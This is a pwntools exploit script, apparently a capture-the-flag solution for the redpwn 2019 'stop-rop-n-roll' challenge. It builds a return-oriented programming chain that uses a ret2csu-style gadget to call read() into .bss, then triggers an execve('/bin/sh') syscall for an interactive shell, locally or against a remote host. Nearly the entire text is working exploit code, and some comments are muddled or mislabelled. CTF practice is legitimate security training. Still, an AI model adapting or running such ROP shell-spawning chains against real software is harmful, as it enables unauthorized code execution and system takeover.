# https://sentrywhale.com/writeup/redpwn2019-stop-rop-n-roll
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './srnr'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

gadget1 = 0x400800
'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword [r12 + rbx*8]
'''
pop_rdi = 0x400823
pop_rsi_r15 = 0x00400821
pop_rbx_rbp_r12_r13_r14_r15 = 0x40081a
binSh = 0x400c49
syscall = 0x400703
bss_section = 0x00602020+0x30

io = start()
'''
call read(0, .bss, 59)
send len(payload = [addr syscall_gadget] ["/bin/sh\x00"] [addr .bss+8] [fill with null bytes]) = 59 to the read call
call syscall_gadget(.bss+8, .bss+16, 0) <==> execve("/bin/sh", ["/bin/sh"], 0)
'''
payload = flat({
    # buf = [rbp-0x9] => offset = 0x9 + 0x8 = 17
    17: [
        pop_rbx_rbp_r12_r13_r14_r15,
        0x0,                # rbx
        0x1,                # rbp
        elf.got.read,       # r12 [call]
        0x0,                # edi <- r13d
        bss_section,        # rsi <- r14
        # Read function returns the number of bytes read, 
        # obviously we will call read function and send 59 bytes for the execve syscall
        59,                 # rdx <- r15
        gadget1,            # ret - call read(0, .bss, 59) => rax = 59

        "JUNK"*2,           # add rsp, 8
        0x0,                # rbx
        0x1,                # rbp
        bss_section,        # r12 [call]
        bss_section+8,      # rsi
        bss_section+16,     # rdx
        0x0,                # rdx
        gadget1,            # ret
    ]
})
#second pl -> [addr of syscall][addr of binsh]["/bin/sh"][0...] -> len = 30
payload2 = b""
payload2 += p64(syscall)
payload2 += b"/bin/sh\x00"
payload2 += p64(bss_section+8)
payload2 += b"\x00"*(59-len(payload2))

print(io.recvuntil(": "))
io.sendline('0')
io.sendline(payload)
# sleep(1)
io.send(payload2) # sedline why ????
io.interactive()